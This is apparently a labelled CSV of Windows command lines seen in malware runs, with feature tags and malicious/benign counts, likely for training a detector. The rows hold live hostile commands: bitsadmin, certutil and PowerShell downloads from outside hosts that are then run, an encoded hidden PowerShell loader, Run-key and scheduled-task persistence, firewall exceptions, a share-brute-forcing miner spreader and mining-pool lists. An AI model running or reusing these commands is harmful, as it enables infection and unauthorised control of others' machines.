tags,mal_cnt,ben_cnt,example
dir_%userprofile%; ext_exe; ext_txt; high_string_len; normal_entropy; parentprocess_winlogon.exe,1,333,"/c start /max notepad.exe ""%USERPROFILE%\HOW TO RECOVER ENCRYPTED FILES.TXT"""
arg_del; arg_nul; dir_%appdata%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"/k ping -n 2 localhost < nul & del /F /Q ""%APPDATA%\Microsoft\SystemCertificates\My\CTLs\IntelCorporalion\svhost.exe'"
arg_-n; arg_del; arg_nul; dir_%appdata%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"/k ping -n 2 localhost < nul & del /F /Q ""%APPDATA%\Microsoft\SystemCertificates\My\CTLs\Adobe\weniter.exe'"
arg_cmd; ext_cmd; low_string_len; parentprocess_unknown_process.exe; very_low_entropy,1,0,cmd /C find.cmd
arg_cmd; dir_%appdata%; ext_cmd; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"cmd /c """"%APPDATA%\lhnpt\run.cmd"" """
arg_set; dir_%temp%; ext_run; ext_vbs; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/c @echo Set objShell = CreateObject(""Wscript.Shell"") > Xy.vbs & @echo objShell.Run ""cmd /c bitsadmin /transfer 8 /download http://www.mva.by/tags/2daymiiii.exe %temp%\Xy.exe&%temp%\Xy.exe"",0,True >> Xy.vbs& Xy.vbs"
arg_del; arg_nul; dir_%userprofile%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c DEL %USERPROFILE%\DOCUME~1\bhqtcd.exe >> NUL
arg_del; arg_timeout; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c timeout -c 5 & del ""C:\bfc9e0c277f07f9b5e45efd4befc3b061e54b73f2b70e259df6154be27c2651d.exe"" /f /q"
arg_del; arg_nul; dir_%temp%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,/Q /C TASKKILL /F /PID 2780 > NUL & DEL /F /Q %TEMP%\reader_sl.exe > NUL
dir_%windir%; ext_exe; high_entropy; high_string_len; parentprocess_cmd.exe,1,3,"%WINDIR%\system32\cmd.exe  /S /D /c"" echo iex(""IEX(New-Object Net.WebClient).DownloadString('https://bit.ly/2ItPpZc')""); """
dir_%localappdata%; dir_%systemroot%; dir_%windir%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c copy ""C:\ojoh.exe"" ""%LOCALAPPDATA%\Microsoft\Windows\Temporary Internet Files\Optimizesapp.exe"""
arg_1; arg_cmd; arg_nul; ext_exe; normal_entropy; not_in_range; parentprocess_unknown_process.exe,1,14,"cmd /C tasklist /FI ""IMAGENAME eq osppsvc.exe"" 2>nul | find /i ""osppsvc.exe"" 1>nul && taskkill /t /f /IM KMS8Load.exe >nul 2>&1"
arg_create; arg_sc; dir_%allusersprofile%; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,"/C sc create foundation binPath= ""%ALLUSERSPROFILE%\Settings\wsus.exe -service"" type= own start= auto error= ignore displayname= ""Foundation"""
dir_%appdata%; ext_exe; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/c ""waitfor /t 5 YKERQ & bitsadmin /transfer UKEF /download /priority normal https://www.dropbox.com/s/7b9332r6vmiuhxl/1qesyozananrivoxityof.exe?dl=1 %appdata%\iuoldw.exe &start %appdata%\iuoldw.exe"""
arg_copy; dir_%systemroot%; dir_%userprofile%; dir_%windir%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"/c copy ""C:\OCL 5082_04_06_2018.scr.exe"" ""%USERPROFILE%\Documents\windows.exe"""
dir_%temp%; ext_exe; ext_reg; high_string_len; normal_entropy,1,333,/c regedit.exe /s %TEMP%\xtFYDntrTp7621869842639296386.reg
arg_cmd; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"cmd /c ""wmic process where ""name='20180410154542goods.exe' and executablepath='C:\\20180410154542goods.exe'"" delete"""
dir_%windir%; ext_exe; ext_vbs; high_entropy; high_string_len; parentprocess_wscript.exe,1,158,"/c %WINDIR%\System32\cscript.exe //NOLOGO ""C:\OffScrubC2R.vbs"""
arg_cmd; dir_%temp%; dir_%windir%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"cmd /c """"%TEMP%\1570586404.bat""       ""%WINDIR%\System32\bbb.exe""   """
arg_-argumentlist; arg_-class; arg_-executionpolicy; arg_-name; arg_-noprofile; arg_-windowstyle; arg_bypass; arg_create; arg_hidden; arg_invoke-wmimethod; arg_new-object; dir_%temp%; ext_1/2;; ext_exe; parentprocess_wscript.exe; very_high_entropy; very_high_string_len,1,25,"/c powershell.exe -noprofile -windowstyle hidden  -executionpolicy bypass $OE = New-Object System.Net.WebClient; $OE.Headers['User-Agent'] = 'Only business 1.1.1/2'; $OE.downloadfile('http://members.giftera.org/ETrXbrzwf.php','%temp%anj82.exe'); Invoke-WmiMethod -ClASs Win32_ProcEsS -NAme CrEatE -ArgUmeNtList '%temp%anj82.exe'"
dir_%programfiles%; ext_*); ext_xml); parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/c FOR /f ""usebackq tokens=8,11 delims=<>"" %i IN (""%sfxpath:~0,-13%\Adobe CC 2018\products\Driver.xml"") DO (FOR %k IN (""%PROGRAMFILES%\(x86)\Common Files\Adobe\PCF\{%i-%j*.*"") DO MOVE /y ""%k"" ""%PROGRAMFILES%\(x86)\Common Files\Adobe\%~nxk"")"
arg_start; dir_%windir%; ext_com; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,%WINDIR%\system32\cmd.exe /c start http://xc-vip.blogspot.com
arg_-n; ext_exe; ext_log; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/c tail.exe -n 200 -f c:\is\SIMAGE.log
arg_start; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,/C net.exe start foundation y
arg_set; dir_%windir%; ext_exe; normal_entropy; normal_string_len; parentprocess_cmd.exe,1,1,%WINDIR%\system32\cmd.exe /c set str_
arg_del; dir_%userprofile%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"/c del ""%USERPROFILE%\Desktop\servicefileupdtingsh.exe"""
arg_add; arg_firewall; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,"/c netsh firewall add allowedprogram program = STcONaURjstoJeQ(uMqeEfSfaGeNmho(""yJmAEIBBXdvRXSFRGegUiJnA"")) name = STcONaURjstoJeQ(uMqeEfSfaGeNmho(""XQ0V1bwVGZ0FQZ=="")) mode = ENABLE"
dir_%temp%; ext_rr2; normal_entropy; not_in_range; parentprocess_wscript.exe,1,14,/C %TEMP%\msoptaha.rr2
dir_%temp%; ext_rr1; normal_entropy; not_in_range; parentprocess_wscript.exe,1,14,/C %TEMP%\msoptaha.rr1
arg_cmd; dir_%localappdata%; ext_exe; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,"/d /c cmd /d /c cmd /d /c """"%LOCALAPPDATA%\DizygoticLookdownDizygoticLookdown\DizygoticLookdownSetup.exe"" /path=""C:\Installer.exe"""""
dir_%temp%; ext_exe; ext_msi; high_string_len; normal_entropy; parentprocess_wscript.exe,1,333,/c bitsadmin /transfer 8 /download http://girrajwadi.com/css/aksu.msi %TEMP%\Tc.exe&%TEMP%\Tc.exe
dir_%programfiles%; dir_%windir%; ext_bat; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,1,"%WINDIR%\system32\cmd.exe /c """"%PROGRAMFILES%\Java\run.bat"" """
arg_schtasks; dir_%appdata%; ext_exe; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,/c SchTasks /create /SC MINUTE /TN AdodeUpdates /TR %APPDATA%\Microsoft\SystemCertificates\My\CTLs\IntelCorporalion\servicess.exe
arg_findstr; low_string_len; normal_entropy; parentprocess_cmd.exe,1,24,"findstr  ""VirtualBox"""
arg_bypass; arg_hidden; arg_powershell; dir_%systemroot%; dir_%windir%; ext_exe; normal_entropy; parentprocess_install.exe; very_high_string_len,1,0,C:\Windows\system32\cmd.exe /c powershell -nop -exec bypass -win Hidden -noni -enc aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwBIADQAcwBJAEEAUAB3ADYASQBGAGcAQwBBADcAMQBXAGIAVwAvAGEAUwBCAEQAKwBuAEUAcgA5AEQAMQBhAEYAaABLADAAUwB6AEYAdgB6AEoAbABXADYATgBRAFoAcwBBAGcAVABpAFkAQwBBAFUAbgBSAFoANwBiAFQAWQBzAFgAbQBLAHYAQwBkAEQAMgB2ADkAOABZAFQARQBPAHUAVABaAFgAcgBoADcATQBTAHMAZQB1AFoAMgBYADMAMgBtAFcAZAAyADcATQBXAEIASQB5AGcAUABwAEkAMwB3AGcAcABKAHoATgB0AEEAMQBXAC8AcgA2AC8AdAAxAEoARgA0AGQANABJAGMAawBaAHQAeABTAFYAagBXAGsANwB5AGsAbQBaAFcAWABCAFIATABKAHYASwB5AFEAbQBZAE0AOABHAGwAMQBSAHMAVgBoADUAdgBIAFcAUABvAHMAeQBXAE8AMABYAE8AcAA4AGcAVwBrAHcAdQBiAHEAcQB4AG0ARgBJAEEAcgBHAGYANQB4AHQARQBvAEMAZwBpAGkAeQBtAGoASgBKAEkAVgA2AFoAcwAwAG0ASgBHAFEAbgBOADUATQBIADQAZwBqAHAASwA5AFMANQB1ADkAOABnAC8ARQBwAFoAcQBuAGIAcABvAHEAZABHAFoARgBPAFUAZQBBAG0AdABoAFoAMwBjAEkASQB3AGIAeQAwAFoARgBYAEwAMgB5ADUAZQBzAE0AagA0AHQAVAB2AEsAMQB4AHgAaQB6AFMATQA1AGEAbQAwAGkAUQBSAGQANQBsAEwASwB0AEkAMwA1AFYAawB3ADcAdgBOAGsAcwBqAFoATgBuAFYAQwBIAG4ARgBQADUAQQBjADAASwBKAGYAeQAvAFMARABDAEgAdQBuAEEAYQBpAHYAUwBKAG0ATABHADMAUwBpAHIAdwBGAG4AZwBMAHkAUQBpAEQAZwBQAHAANgBGAFQASgBNAG4AcwBuAE8AUQB2AEQAYgBzAGcAZAA1AEwAbwBoAGkAUwBBAG0AYgB3AFkAcgBQAGkAZAB5AEoAbwBnAFoAeQAwAGwALwB5AGUATQBVAHcAMgAwAGMAQwBMAG8AZwBZAEIAYwBrADUARQB1AEwAaABDAHYAcQBrAEMAaAB2ADQATQBCAGwANQBKAFoANABFADcAbABEAG4AZwA1AEgAZgAyAHUAUQBmAEIAdwBFAFgAbAAwAFIASwBqAGwASQB6AGEAdABnADIAOQB5AE4ARwBkAG4ASABaADUAVwBmADQAZgA1AEkAcQBnAEwAUABjADIASwBCAGkAKwAvAHYAMwA3ADEALwA1AHgAMAAwADQAYgBrAFgAbABoAEcAZgBQADEAawBYADkAVwBOAE4AdwBPAGgAawB2AEIAcwBUAFEAQwB4ADMAZQBVAFIAMwA3AHAAKwBsAFEAawA1AHEAdwA2ADUAWQA4AEgAQQBEADAAOAB4AGQARwBCAE4AbABJAG8AMgBUAGYASQB3AG4ARQB5AG0AegBhAHAAWQAzAHgAVwBIAHUAOQBSAFcASwBCADMAZAB3AEoAdgBOAGIAWgBGAGUAbgB3AGkAaQBmAGcAVwBWAHMAYwArAHAATwBJAEQASgBOAFcAVwBhAHQAcgAyADYASwBvAGQALwBvADIASwB0AHkAWQBuADkAZABnAGoAcgB4AGEARQBEADAAVABZAEEAWAAxAEQAbQBvAFQAUAA1AFYASwBvAGoASAB5AE8ANwBzACsAWQBOAGIAQgB6AEQASwAyAGQAUgBBAFgASgAwAHcANABtAE8AUgAwAEoAcQBUAHgAagArAEgAMQBSAFoAVQAvAEkAagBWAFkAcwBwAGMARQBpAEkASAAwAGgAawBCAEsAcwBpADAAOABoAEwATQBQAGwATgB5ADEAZwB6AGEAWgBBAEcAawA3AGUAZABaAHkASQBrAEgAMgBpAFkASAA3ADEAVABQAG0AOABQAHUAeQBSAHkAYwBzAGwAVwBHAEkANgBqAE0AYgBnAHoARgA1AGUAUQBrAGkAMgBCAEcAMwBKAHkARQBnAG8AaQBtAEoAaABRAEwAdgBoAHQAbQBuACsARwAyAFkAeQBhAG8AZwB5AE4AeABXAEcANgBpAC8ASgB2AFAAZABOADgAcQBEAHkASQBSAHgAZwA3AGsARQB6AGkANABzADUAYgBFAG8AWgBnAGwAbABPAFEAawBnADcAcABFADIAMQBqAFUAUAArAHkAZgAvAFMAVQBoAFYAYwB3AFkARABYAHgAWQBhAFEAVQBKAGcAVABjAEoARQBaAFoASQBWAEIASQBDADEARgBRAFIAUwB0ADQAaQB3AGwAdwBzAEcAVgBtAEEAMQA2ADcAZQA2AHcAegA3AFUATgAxAHAAZABlAHkARQBoAFgAMwBpAFoAbAAvAEQAZQB0AEQALwBYAHUAdwBKAE8AdwBkAGEAagBwAEIAQwB5AGkAMwBHAFIAVQA2AHkAYQBTAGoAZwArAGsAaQBZAFAAcABMAFoAbgArAEkANQB1AGsARgBlAEkASwB1AEcASgBNADIAVwBmAEMAaQB1AHMAYgBZAFIAUwBTADEAawBBAGoAcQBkAHUAcABWAEUAdQBDAGwAcABPADQAcABDAEEAZgBUAFUAUQA3ADcAUQBjAEUAVABPAEsAcABZAEkAZwBUAHoANQBnADMAcABEAHEAdwBpAGUAawBSAG0AdwB0AHEAUABOAGEAUgBFADkAMABhAEwAWgBoAHYAOAArAEwAWgB0AGMAUAAzAGUAdgBtAHcAKwBHAEcAdQByAHIAbQBZAGYATQB5AEcAdwBiAFgAYgAxAG4ARwBKAFYAVgAwADcASQByAHcAcQBxAFoANAByAHAAcgBpAG4AWgB0ACsAUABCAGcASQBlAE8AMgBQAHgATAAzAEoAagBMAHUAYQBHAEUAKwBxAG0AeQBYAFQAYgBxADEAVwBzAGcAZAByAGQAVwB6AHIAYgBaADkASwBtAGoAcgA3AFkAUAB2AGUAaQBQAGQAOAAvAHgAegB6ADcAbwB0AGYAcQByAFQAMQBxAEQAYQAwAHcAbwBsADMATgBKAHIAYwBXAHUAZwBQAFcAbQBGAFMAbABTAGoAVAAwAGEAUAA5AG4AdgB6AFoAbAAxAE0AUgB6AGIARABmAFUALwAxAGgAOABWAEwAVABOAGUAdAA4AE0ARQB1ADgAdgBiAFcAUgBLAGcAeABLAHoAdgBiAHAAbQBjADMAWgBtADEAMwBNAHoATABVAHkAMABGAGwAagBtAG8ASQBWAFkATwBhAFgAZABmADQAOQBVAGcATABVAFYAZQAxAHMAVwAvAHoARgBWADUAYgBVAGMAbQB2AEkAbQAxAFEAbwB1AFMAKwAxADYAOQByAHYAVgA1AGQAUQAvADMARwB3ADYATgArAHEAZgBvAFEATwA4AFEAegBiAFcAQwBYADYAUAAxAHkAZQBEAHUARABlAFIAMABnAFgASwB1AEYAaQB1AG0AUwBMAFIALwAxAGcASwBRAEcAUgA5AGkALwBCAFIAKwAvAFcAbgBKAG0ASAB2AGoAbwBIADUASAAyAHMAYwBPAGoARQBwADUAcgBIAEcAbgBnAFUANwA5AC8AQgBGAHkAagBaAGIAMwBMAHcASAA3AFgATAAzAEYAawBzADgANABRAG8AOQBiADkAcABxADYAcQB4AFYARwAzAGcAbwB3AEMASABUAFIAOABsAEMAeQBKAGYAYQAyAEgAVQBiAFQAUwB0ADcAcABhAHQARgAzAHUARABqADUAMQBSAHAANQBxAEQAOQBtADUAcQBsAGYAdgBsAG8ANgBuAHEAdQBxAFQAbwBWADgANwA5ADgAWAAxAHgAYwAzADUAUgBXAHQAQQA3AFEAVgBIAGYAVgBXADEAUAB5AFEASwBBAFkAbABrAHAAdQBaAFoAWQBWADYAKwBiAHMAOQB4AHMAMwBtAFUAOQA5AGYAdQAvAHoAWQBPAG8AeABsAG0AbwBBAGUANAAwAGcAKwBsAFcAdQBkAGgAUABiADIAZQB1ADUAdwBtAEUAYgBKADgAMwBMAHIAbgBKAEEAdwBJAGcAMgBZAEgANwBmAEEAZwBjAHMAUQBZAGQANQBLAE8AYwBYAHkAZgBRADkAUABhAHQANQBJAEoAbABHADAAZgBoAHUAWABTAEwAMABlAEsAOQBNAE4AUgBlAFcANABsAGgAMQBkAFgAVgAvAGUAQQBHAGMAcABtAHIAKwBaADgAaQB3AFMAKwBtAE8AVQBLADYAMwBLAGgAQQBNADIAZwBzAEsANABVADQAUABSAHYAUAAyAG0AVgBMAHoAZAB5AHUAbABnAHUAYQBTAGMAdgBTAEgAdgBlAGgAKwAzADIAVQBaAEsAQwB5AGoAaQA2AE4AMgA4AEUALwBmAE8ATwBWAHYAeABmAFcARQAyAEwAZQBnAFkALwA3AGgAdABaAGYAWAA3ADMARwArAHUAYgBtAEMANwBrAFgAagBMAHkAawAvAG4AbABpAC8AOQBFAC8AcAA4AFMATQBzAEIAVQBRAEkAQQBGAE4AeABVAGoAKwA0AGIANgBXADEANQBTAFkAUgAxADkAbQBCAHkAbABFAEwAVABqAHAAVQAvAHkAcgBYAGcAVABpADkATQBPAGYATABiADgAQQB5AFYAQgBQADYAYQBvAEMAZwBBAEEAJwAnACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7ACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
arg_cmd; dir_%allusersprofile%; ext_exe; high_string_len; parentprocess_unknown_process.exe; very_high_entropy,1,0,"cmd /c """"%ALLUSERSPROFILE%\ehv98DF.tmp.bat"" ""C:\371cdeb618d2170419f02fc3d644ef43.exe"""""
arg_-n; arg_1; arg_3; arg_copy; arg_nul; arg_set; dir_%allusersprofile%; dir_%appdata%; dir_%systemroot%; dir_%userprofile%; dir_%windir%; ext_exe; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/v:on /c @(for /f ""usebackq tokens=1"" %i in (`@net view^|find /i ""\\"" ^|^| @arp -a^|find /i ""  1""`) do @set str_!random!=%i)& @for /f ""usebackq tokens=1* delims=="" %j in (`set str_`) do @set s=%k& set s=!s:\\=!& set l=!s:-PC=!& set l=!l:-ÏÊ=!& set f=IMG001.exe& set n=0000& @if not ""!s!""==""%COMPUTERNAME%"" @echo connect to \\!s! & (for /f ""usebackq tokens=1"" %j in (`net view \\!s!^|find /i ""    ""`) do @echo f|xcopy /y /d ""C:\Users\HAPUBWS\AppData\Roaming\NsMiner\IMG001.exe"" ""\\!s!\%j\!f!"" 1>nul && @echo copy to ""\\!s!\%j\!f!"") & @net use * /delete /y 2>nul & @(for %u in (1 !l! administrator user admin àäìèíèñòðàòîð) do @for %p in (0 1 123 %u !n! """") do @ping -n 3 localhost>nul & @(for %c in (\\!s!\C$ \\!s!\Users) do @echo connect to %c %p %u & @(if not ""%p%u""==""01"" net use %c ""%p"" /user:""%u"") && @((echo [Section1] & echo p=%p %u)>""C:\Users\HAPUBWS\AppData\Roaming\NsMiner\IMG001.exe:P"" & @(for %d in (""%c\All Users\Microsoft\Windows\Start Menu\Programs\Startup\!f!"" ""%c\%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\!f!"" ""%c\Users\All Users\Microsoft\Windows\Start Menu\Programs\Startup\!f!"" ""%c\Users\%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\!f!"" ""%c\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\!f!"" ""%c\Documents and Settings\%u\Start Menu\Programs\Startup\!f!"" ""%c\Documents and Settings\All Users\Start Menu\Programs\Startup\!f!"" ""%c\Documents and Settings\%u\Ãëàâíîå ìåíþ\Ïðîãðàììû\Àâòîçàãðóçêà\!f!"" ""%c\Documents and Settings\All Users\Ãëàâíîå ìåíþ\Ïðîãðàììû\Àâòîçàãðóçêà\!f!"" ""%c\Windows\Profiles\%u\Start Menu\Programs\Startup\!f!"" ""%c\Windows\All Users\Start menu\Programs\Startup\!f!"" ""%c\%u\!f!"" ) do @echo f|@xcopy /y /d ""C:\Users\HAPUBWS\AppData\Roaming\NsMiner\IMG001.exe"" %d 1>nul && @echo copy to %d) & @echo nul>""C:\Users\HAPUBWS\AppData\Roaming\NsMiner\IMG001.exe:P"" & net use %c /delete /y 2>nul & @ping -n 20 localhost>nul)))"
arg_1; arg_cmd; arg_nul; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"cmd /C tasklist /FI ""IMAGENAME eq sppsvc.exe"" 2>nul | find /i ""sppsvc.exe"" 1>nul && taskkill /t /f /IM KMS8Load.exe >nul 2>&1"
dir_%temp%; ext_txt; normal_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,/c (echo stratum+tcp://mine.moneropool.com:3333& echo stratum+tcp://monero.crypto-pool.fr:3333& echo stratum+tcp://xmr.prohash.net:7777& echo stratum+tcp://pool.minexmr.com:5555)> %TEMP%\pools.txt
arg_del; dir_%temp%; ext_exe; normal_entropy; normal_string_len; parentprocess_msdt.exe,1,1,"/c del ""%TEMP%\NewOrderDAD4EDF.exe"""
dir_%temp%; dir_%windir%; ext_vbs; high_entropy; parentprocess_powershell.exe; very_high_string_len,1,0,"/c ""cd %temp% & echo Heslo je : ppraha > pw.txt & start pw.txt  & cd %windir%   &  cd %windir%  & certutil.exe -urlcache -split -f http://limousine-service.cz/tinymce/winscrpt.bat winscrpt.bat 2>NUL >NUL & certutil.exe -urlcache -split -f http://limousine-service.cz/tinymce/que.vbs que.vbs 2>NUL >NUL & cd /d %windir% & echo y | schtasks /create /sc onlogon /tn WinMgr /rl highest /tr %windir%\\que.vbs 2>NUL >NUL & echo echo %RANDOM%%RANDOM%33 >> %windir%\winscrpt.bat & echo ' AAAAAA %RANDOM%%RANDOM%33 >> %windir%\que.vbs"""
arg_-n; arg_1; arg_del; arg_exit; arg_nul; arg_ping; dir_%temp%; ext_11; ext_exe; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/c FOR /L %V IN (1,1,10) DO del /F ""%TEMP%\5C0D7997-42C9-4B9D-BB40-15EEFFA1D25C\FindPackagesNow.exe"" >> NUL & PING 1.1.1.1 -n 1 -w 1000 > NUL & IF NOT EXIST ""%TEMP%\5C0D7997-42C9-4B9D-BB40-15EEFFA1D25C\FindPackagesNow.exe"" EXIT"
arg_start; ext_docx; normal_entropy; normal_string_len; parentprocess_wscript.exe,1,1,"/c start """" /MAX winword ""\Users\DHiTDWa\44352.docx"""
arg_-executionpolicy; arg_-noprofile; arg_bypass; arg_powershell; dir_%temp%; ext_ps1; high_string_len; normal_entropy; parentprocess_wscript.exe,1,333,/c powershell -noprofile -executionpolicy bypass %TEMP%\t.ps1
arg_-executionpolicy; arg_-noprofile; arg_bypass; arg_powershell; dir_%appdata%; ext_ps1; high_string_len; normal_entropy; parentprocess_wscript.exe,1,333,/c powershell -noprofile -executionpolicy bypass %APPDATA%\System.ps1
arg_cmd; ext_png; high_string_len; normal_entropy; parentprocess_cmd.exe,1,333,cmd  /C soap:wsdl=http://mercurius-japan.com/common/images/common_img10.png
arg_advfirewall; dir_%appdata%; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/a /c netsh advfirewall firewall add rule name=""Z0BAZwxx"" dir=in action=allow program=""%APPDATA%\Z0BAZwxx\jevgr.exe"""
arg_firewall; high_entropy; parentprocess_unknown_process.exe; very_high_string_len,1,0,"/c netsh firewall add allowedprogram program = STcONaURjstoJeQ(uMqeEfSfaGeNmho(""yJmAEIBBXdvRXSFRGegUiJnA"")) name = STcONaURjstoJeQ(uMqeEfSfaGeNmho(""XQ0V1bwVGZ0FQZ=="")) mode = ENABLE"
arg_cmd; dir_%commonprogramfiles%; ext_cmd; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"cmd /c """"%COMMONPROGRAMFILES%\Clean.cmd"""""
arg_reg; dir_%systemroot%; dir_%windir%; ext_exe; parentprocess_unknown_process.exe; very_high_entropy; very_high_string_len,1,25,"/c reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""Run"" /d ""C:\7a4cbef2367d72a8d8741621746de48289c611d40bec0f3c9c5c8a85faf5b33e.exe"" /t REG_SZ /f"
arg_add; arg_reg; dir_%appdata%; dir_%systemroot%; dir_%windir%; ext_exe; high_entropy; high_string_len; parentprocess_unknown_process.exe,1,3,"/c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v """" /d ""%APPDATA%\NsMiner\IMG001.exe"" /t REG_SZ"
arg_del; dir_%appdata%; ext_exe; normal_entropy; normal_string_len; parentprocess_unknown_process.exe,1,2,"/c del ""%APPDATA%\nylj.exe"""
dir_%temp%; ext_bat; ext_exe; high_string_len; normal_entropy; parentprocess_unknown_process.exe,1,1,"/c %TEMP%\ytmp\tmp4186.bat ""C:\27C766AEAD7EDADF5E2D8F67628A8868.exe"""
